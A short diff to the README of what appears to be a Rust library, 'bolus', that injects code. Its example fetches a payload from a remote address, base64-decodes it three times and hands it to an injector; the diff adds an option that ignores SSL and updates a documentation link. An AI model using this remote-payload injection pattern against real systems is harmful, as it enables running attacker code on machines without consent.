@@ -23,11 +23,14 @@ use bolus::{
 const URL: &str = "http://1.2.3.4/note.txt";
 /// The # of base64 iterations to decode
 const B64_ITERATIONS: usize = 3;
+/// `IgnoreSSL` switch. You know what this does.
+const IGNORE_SSL: bool = false;
 
 fn main() -> Result<(), String> {
     let injector = load(
         InjectorType::Base64Url((
             URL.to_string(),
+            IGNORE_SSL,
             B64_ITERATIONS
         ))
     )?;
@@ -41,4 +44,4 @@ fn main() -> Result<(), String> {
 
 ## Documentation
 
-Full docs at [docs.rs](https://docs.rs/bolus/0.1.1/bolus/)
+Full docs at [docs.rs](https://docs.rs/bolus/latest/bolus/)
